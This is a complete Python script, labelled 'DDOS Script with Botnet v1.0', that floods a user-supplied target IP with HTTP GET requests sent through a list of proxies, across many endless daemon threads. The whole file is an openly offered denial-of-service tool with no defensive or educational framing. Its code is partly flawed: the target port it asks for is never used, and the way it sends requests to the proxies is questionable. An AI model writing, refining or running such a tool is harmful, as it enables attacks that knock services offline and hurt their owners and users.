import socket
import threading
import random
import time

def get_proxies_from_file(filename="proxies.txt"):
    """Reads proxies from a file (format: IP:PORT)."""
    proxies = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    except FileNotFoundError:
        print(f"Error: The file '{filename}' was not found.")
        return []
    return proxies

def attack(target_ip, target_port, proxies):
    """The main attack function, executed by each thread."""
    while True:
        if not proxies:
            # This check is mostly for the initial load, as threads run indefinitely
            break

        proxy_str = random.choice(proxies)
        try:
            proxy_ip, proxy_port = proxy_str.split(':')
            proxy_port = int(proxy_port)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((proxy_ip, proxy_port))

            # Using a simple HTTP GET request through the proxy
            # Some proxies might require a CONNECT method for non-HTTP traffic,
            # but for a basic HTTP flood, a direct GET is often sufficient and simpler.
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.sendall(request.encode())
            print(f"Request sent through proxy {proxy_ip}:{proxy_port}")
            s.close()

        except (socket.error, ValueError, socket.timeout) as e:
            print(f"Proxy {proxy_str} failed: {e}. Trying another.")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        
        # A small delay to prevent overwhelming the local machine or the proxies too quickly
        time.sleep(0.01)


def main():
    print("--- DDOS Script with Botnet v1.0 ---")
    
    target_ip = input("Enter target IP: ")
    try:
        target_port = int(input("Enter target port: "))
    except ValueError:
        print("Error: Invalid port number.")
        return

    try:
        num_threads = int(input("Enter number of threads (bots): "))
    except ValueError:
        print("Error: Invalid number of threads.")
        return

    proxies = get_proxies_from_file()
    if not proxies:
        print("No proxies loaded from proxies.txt. Exiting.")
        return
        
    print(f"Loaded {len(proxies)} proxies.")
    print(f"Starting attack on {target_ip}:{target_port} with {num_threads} threads.")

    # Start the threads
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, proxies))
        thread.daemon = True
        thread.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

if __name__ == "__main__":
    main()
